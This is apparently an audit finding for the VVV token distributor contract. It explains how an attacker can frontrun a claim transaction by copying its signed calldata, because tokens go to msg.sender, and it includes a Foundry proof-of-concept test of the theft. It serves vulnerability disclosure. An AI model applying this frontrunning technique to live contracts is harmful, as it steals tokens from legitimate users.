# Attackers Can Steal User Tokens By Frontrunning Claim Transactions

### Summary

The lack of recipient validation in the claim function will cause users to lose their entitled tokens as attackers can monitor the mempool and frontrun legitimate claim transactions by copying their calldata, effectively stealing the tokens since they are sent to `msg.sender` instead of the intended recipient.

### Root Cause

In [`VVVVCTokenDistributor.sol#L131-L135`](https://github.com/sherlock-audit/2024-11-vvv-exchange-update/blob/main/vvv-platform-smart-contracts/contracts/vc/VVVVCTokenDistributor.sol#L131-L135), tokens are transferred to `msg.sender` without verifying if they are the legitimate recipient:

```solidity
            projectToken.safeTransferFrom(
                _params.projectTokenProxyWallets[i],
                msg.sender,
                _params.tokenAmountsToClaim[i]
            );
```

The function only validates the signature and nonce but does not ensure that `msg.sender` is the intended recipient of the tokens.

### Internal pre-conditions

1. User must have a valid signed claim transaction
2. Tokens must be available in the proxy wallets

### External pre-conditions

_No response_

### Attack Path

1. Legitimate user broadcasts a claim transaction with valid signature and parameters
2. Attacker monitors the mempool for claim transactions
3. Attacker spots the user's transaction and copies its calldata
4. Attacker submits the same transaction with higher gas price/priority fee
5. Attacker's transaction gets processed first, successfully claiming the tokens
6. User's transaction reverts due to invalid nonce (already used by attacker)

### Impact

Users suffer from complete loss of their entitled tokens as attackers can steal them through frontrunning. The stolen tokens cannot be recovered as the transfer is final and the off-chain system will mark them as claimed.

### PoC

Add this test case to `VVVVCTokenDistributor.unit.t.sol` and run `forge test --mt test_PoC_Claim -vvv`

```solidity
function test_PoC_Claim() public {
    // Setup: Create arrays for a single project token proxy wallet and claim amount
    address[] memory thisProjectTokenProxyWallets = new address[](1);
    uint256[] memory thisTokenAmountsToClaim = new uint256[](1);

    // Assign values: Use the first project token proxy wallet and claim amount
    thisProjectTokenProxyWallets[0] = projectTokenProxyWallets[0];
    uint256 claimAmount = sampleTokenAmountsToClaim[0];
    thisTokenAmountsToClaim[0] = claimAmount;

    // Generate claim parameters with a valid signature for sampleKycAddress
    VVVVCTokenDistributor.ClaimParams memory claimParams = generateClaimParamsWithSignature(
        sampleKycAddress,
        thisProjectTokenProxyWallets,
        thisTokenAmountsToClaim
    );

    // Vulnerability: An attacker can front-run the transaction and use the same parameters
    // Simulate attacker claiming tokens using the intercepted parameters
    claimAsUser(address(0x99), claimParams);
    
    // Verify: Attacker successfully received the tokens
    assertTrue(ProjectTokenInstance.balanceOf(address(0x99)) == claimAmount);

    // Attempt: Original user tries to claim, but fails due to used nonce
    vm.expectRevert(VVVVCTokenDistributor.InvalidNonce.selector);
    claimAsUser(sampleKycAddress, claimParams);
    
    // Verify: Original user received no tokens
    assertTrue(ProjectTokenInstance.balanceOf(sampleKycAddress) == 0);
}
```
